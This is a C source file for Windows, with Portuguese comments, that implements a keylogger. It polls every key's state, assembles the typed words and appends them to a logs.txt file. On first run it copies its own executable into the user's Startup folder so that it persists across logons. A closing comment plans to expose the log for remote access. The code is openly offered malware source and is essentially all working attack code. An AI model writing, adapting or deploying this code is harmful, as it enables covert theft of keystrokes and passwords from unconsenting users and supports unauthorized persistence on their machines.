#include <stdio.h>
#include <windows.h>
#include <string.h>
#include <stdlib.h>
#include <stdbool.h>
#include <shlobj.h>

bool valPersis();

int main()
{
    valPersis();

    FILE *fptr;

    char palavra[100];
    int count = 0;
    
    printf("Precione qualquer tecla...\n\n");

    while (1)
    {
        for (int vk = 0x08; vk <= 0xFE; vk++)
        {
            if (GetAsyncKeyState(vk) & 0x01)
            {
                // Mapeia o código virtual para scan code
                UINT scanCode = MapVirtualKey(vk, MAPVK_VK_TO_VSC);

                // Monta o valor lParam como se viesse de uma mensagem WM_KEYDOWN
                LONG lParam = (scanCode << 16);

                // Buffer para o nome da tecla
                char keyName[128];
                if (GetKeyNameTextA(lParam, keyName, sizeof(keyName)) > 0)
                {

                    // Backspace
                    if (vk == VK_BACK)
                    {
                        if (count > 0)
                        {
                            count--;
                            palavra[count] = '\0';
                        }
                        system("cls");
                        printf("%s", palavra);
                        continue;
                    }
                    
                    // Enter ou espaço, salva o arquivo
                    if (vk == VK_RETURN || vk == VK_SPACE)
                    {
                        if (count > 0)
                        {
                            
                            // Finalizando o arquivo log txt
                            palavra[count] = '\0';
                            
                            // Salavando arquivo
                            fptr = fopen("logs.txt", "a");
                            fprintf(fptr, "%s\n", palavra);
                            fclose(fptr);
                            
                            count = 0;
                            palavra[0] = '\0';
                            system("cls");
                        }
                        continue;
                    }

                    //  Salvando as teclas e montando a palavra
                    if ((vk >= '0' && vk <= '9') || (vk >= 'A' && vk <= 'Z'))
                    {
                        if (count < sizeof(palavra) - 1)
                        {
                            palavra[count++] = (char)vk;
                            palavra[count] = '\0';
                        }
                    }
                    system("cls");
                    printf("%s", palavra);

                    if (scanCode == 1) break;
                }
            }
        }
        
        
        Sleep(30);
    }

    return 0;
}

bool valPersis()
{
    FILE *varsConf;

    char chave[50], valor[50];
    int VerdOuFal = 0;// Verdadeiro ou falso
    
    varsConf = fopen("config.cfg", "r");
    if (!varsConf)
    {
        char currentPath[MAX_PATH];
        char startupPath[MAX_PATH];
        char newPath[MAX_PATH];

        GetModuleFileName(NULL, currentPath, MAX_PATH);

        if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
        {
            snprintf(newPath, MAX_PATH, "%s\\main.exe", startupPath);
            
            CopyFile(currentPath, newPath, FALSE);
        }

        varsConf = fopen("config.cfg", "w");
        fprintf(varsConf, "pos=0");// pos == true
        fclose(varsConf);
    }

    return false;
}



// Servir esse arquivo de log abrindo um caminho para acesso remoto ou compartilhando esse arquivo localmente
// shell:startup
// se auto copiar 
// ao inves de ter que criar dois arquivos vou fazer um arquivo config onde vai ser salvo se o arquivo ja foi copiado ou nao